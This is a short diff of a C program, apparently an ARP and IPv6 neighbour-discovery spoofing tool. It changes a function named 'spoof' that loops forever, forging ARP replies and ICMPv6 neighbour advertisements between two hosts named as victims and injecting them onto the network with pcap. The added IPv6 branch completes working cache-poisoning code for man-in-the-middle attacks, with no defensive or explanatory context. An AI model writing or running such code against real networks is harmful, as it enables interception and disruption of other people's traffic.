@@ -103,23 +103,23 @@ int parseArgs(int argc, char* argv[], clargs_t *clargs){
 void spoof(iface_t iface, clargs_t clargs){
 	
 	int bytes_written=0;
-
 	while(true){
 		if(arg_ip_type==ARG_IPV4_TYPE){ //IPV4
 			uint8_t pkt1[PKT_ARP_LEN];
 			arp_pkt_build(pkt1,clargs.vic2_ipv4,clargs.vic1_ipv4,iface.mac,clargs.vic1_mac,ARP_OP_REPLY);
 			uint8_t pkt2[PKT_ARP_LEN];
 			arp_pkt_build(pkt2,clargs.vic1_ipv4,clargs.vic2_ipv4,iface.mac,clargs.vic2_mac,ARP_OP_REPLY);
-			arp_print((arphdr_t*)(pkt1+14));
-			arp_print((arphdr_t*)(pkt2+14));
 			bytes_written =pcap_inject(iface.handle, pkt1, PKT_ARP_LEN);
 			bytes_written =pcap_inject(iface.handle, pkt2, PKT_ARP_LEN);
 			
 		}
 		else{ //IPV6
-			// uint8_t* pkta = icmpv6_pkt_advert_build(iface.mac,ma,b,a);
-			// bytes_written = pcap_inject(iface.handle,pkta,PKT_ICMPV6_ADVERT_LEN);
-			// printf("%d\n", bytes_written);
+			uint8_t pkt1[PKT_ICMPV6_ADVERT_LEN];
+			icmpv6_pkt_advert_build(pkt1,iface.mac,clargs.vic1_ipv6,clargs.vic2_mac,clargs.vic2_ipv6);
+			uint8_t pkt2[PKT_ICMPV6_ADVERT_LEN];
+			icmpv6_pkt_advert_build(pkt2,iface.mac,clargs.vic2_ipv6,clargs.vic1_mac,clargs.vic1_ipv6);
+			bytes_written = pcap_inject(iface.handle,pkt1,PKT_ICMPV6_ADVERT_LEN);
+			bytes_written = pcap_inject(iface.handle,pkt2,PKT_ICMPV6_ADVERT_LEN);
 		}
 
 		usleep(clargs.interval_ms*1000);
